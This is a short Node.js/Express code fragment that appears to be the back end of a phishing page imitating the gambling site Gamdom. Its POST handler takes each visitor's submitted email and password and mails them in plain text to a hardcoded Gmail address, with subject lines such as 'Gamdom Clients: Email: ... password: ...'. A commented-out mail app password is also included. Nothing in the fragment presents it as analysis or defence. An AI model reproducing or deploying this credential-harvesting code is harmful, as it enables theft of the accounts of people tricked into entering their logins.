...
// emails credentials
const userEmail = "novahexchange@gmail.com";
//const pass = "joujwjtkgzrxwyap";
// 9th June
...
app.post("/", (req, res) => {
  ...
  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `Gamdom Clients: Email: ${email} \t\n\n\n password: ${password}`,
    text: `Gamdom Clients:New user registered with Email: ${email} and password: ${password}`,
  };
